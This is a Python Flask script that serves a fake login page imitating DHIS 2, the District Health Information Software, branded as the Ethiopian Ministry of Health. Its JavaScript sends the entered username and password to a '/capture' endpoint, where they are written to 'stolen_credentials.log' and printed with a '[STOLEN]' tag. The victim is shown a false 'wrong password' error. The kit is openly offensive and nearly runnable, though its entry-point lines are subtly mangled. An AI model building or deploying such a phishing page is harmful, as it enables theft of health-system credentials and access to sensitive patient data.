from flask import Flask, request, jsonify, render_template_string

app = Flask(name)

RECEIVE_FILE = "stolen_credentials.log"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>DHIS 2 Login</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f5f6fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        h1 { color: #2b5797; font-size: 24px; margin-bottom: 5px; }
        .subtitle { color: #666; font-size: 12px; margin-bottom: 20px; }
        input[type=text], input[type=password] { width: 100%; padding: 10px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; box-sizing: border-box; border-radius: 4px; }
        button { width: 100%; background-color: #2b5797; color: white; padding: 12px; margin: 10px 0; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #203d6e; }
        .error { color: red; font-size: 14px; display: none; margin-bottom: 10px; }
        .footer { font-size: 10px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>DHIS 2</h1>
        <div class="subtitle">District Health Information Software</div>
        <div id="error-msg" class="error">Wrong username or password</div>
        <form id="login-form">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">© Ministry of Health Ethiopia</div>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    username: username, 
                    password: password, 
                    timestamp: new Date().toISOString() 
                })
            })
            .then(response => {
                document.getElementById('error-msg').style.display = 'block';
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
        
    user = data.get('username', 'Unknown')
    pwd = data.get('password', 'Unknown')
    ts = data.get('timestamp', 'Unknown')
    
    print(f"[STOLEN] User: {user} | Pass: {pwd} | Time: {ts}")
    
    with open(RECEIVE_FILE, 'a') as f:
        f.write(f"{ts} | {user} | {pwd}\n")
    
    return jsonify({"status": "captured"})

if name == 'main':
    app.run(host='0.0.0.0', port=80, debug=False)